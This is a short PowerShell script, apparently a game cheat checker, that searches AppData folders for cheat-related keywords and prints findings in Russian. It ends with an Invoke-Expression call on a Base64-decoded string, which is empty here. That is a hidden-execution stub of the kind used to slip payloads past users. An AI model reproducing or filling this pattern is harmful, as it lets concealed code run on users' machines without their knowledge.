$k='cracked','inject','esp','aimbot','recoil','norecoil','spread','ExoVision','exe','macro','rshot','silent';$r=@();$f=Get-ChildItem -Path "$env:APPDATA","$env:LOCALAPPDATA" -Recurse -File -ErrorAction SilentlyContinue -Depth 1|Where-Object{$_.Length -lt 2MB}|Select-String -Pattern ($k -join '|') -ErrorAction SilentlyContinue;if($f){foreach($file in $f){$r+=$file.Path}};Write-Host "НАЙДЕНО:" -ForegroundColor Red;if($r.Count -gt 0){$r|Get-Unique|ForEach-Object{Write-Host $_}}else{Write-Host "Ничего не найдено" -ForegroundColor Green};Start-Sleep -Seconds 2;Invoke-Expression([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('')))
